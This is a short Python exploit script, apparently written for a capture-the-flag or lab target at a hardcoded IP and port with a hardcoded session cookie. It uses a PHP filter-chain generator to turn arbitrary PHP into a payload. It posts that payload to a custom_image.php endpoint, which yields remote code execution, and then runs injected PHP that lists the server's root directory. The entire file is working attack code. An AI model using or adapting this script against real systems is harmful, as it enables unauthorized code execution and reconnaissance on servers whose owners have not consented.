import requests
from subprocess import check_output
import re

URL = "http://103.167.132.174:55127"
PHPSESSID = "f5b312b6ba02513f4dbcf6a96105e505"


def make_payload(code: str):
    return check_output(
        ["python3", "./filter_chain.py", "--chain", code]).decode()


def prettyfy(txt: str):
    return re.findall(r"(?<=<br>).*?(?=</form>)", txt, re.DOTALL)[0]


def send_code(code, url=URL):
    payload = make_payload(code).strip().split("\n")[1]
    res = requests.post(url+"/custom_image.php", data={
        "custom_image": payload,
    }, cookies={"PHPSESSID": PHPSESSID},
        # proxies={"http": "http://localhost:8080"}
    )
    return prettyfy(res.text)


def readdir(dir: str):
    code = ('''
$dir = "'''+dir + '''"; if (is_dir($dir)){
  if ($dh = opendir($dir)){
    while (($file = readdir($dh)) !== false){
      echo $file . "\\n";
    }
    closedir($dh);
  }
}
    ''').strip().replace("\n", "")
    print(code)
    code = f"<?php {code}; ?>"
    print(send_code(code))


if __name__ == "__main__":
    readdir("/")
